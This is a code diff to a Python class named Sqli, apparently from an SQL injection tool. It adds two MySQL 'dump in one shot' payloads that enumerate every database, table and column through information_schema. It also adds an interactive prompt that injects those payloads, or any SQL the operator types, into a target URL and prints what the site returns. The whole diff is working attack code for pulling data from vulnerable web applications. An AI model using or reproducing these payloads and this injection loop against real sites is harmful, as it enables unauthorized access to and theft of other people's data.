@@ -6,6 +6,8 @@ class Sqli:
 
     def __init__(self, url):
       self.url= url
+      self.dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
+      self.show_dbs = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name, 0x3c62723e))))x)"
 
     def information(self, level=1):
         dios = Dios().get_information()
@@ -64,4 +66,36 @@ class Sqli:
                     "ssl": ssl,
                     "openssl": openssl,
                     "symlink": symlink,
-                    "socket": socket }
+                    "socket": socket 
+        }
+    
+    def command_line(self):
+        user = Dios().build(Dios().user())
+        try:
+            response = requests.get(self.url.replace('*',user))
+            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
+            user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
+            user        = user.group(1)
+            cmd         = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
+            if cmd == "dump_data":
+                r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
+                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+                if re.search("<br>", output):
+                    br = output.split("<br>")
+                    for result in br:
+                        print(result)
+                    self.command_line()
+            elif cmd == "show dbs":
+                r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
+                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+                print("Database : ")
+                print(output.replace("<br>", "\n"))
+                self.command_line()
+            else:
+                r           = requests.get(self.url.replace('*', Dios().build(cmd)))
+                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+                print(f"\n[+] Output : {output}\n")
+            self.command_line()
+        except Exception:
+            print("\n[!] Syntax Error!\n")
+            self.command_line()
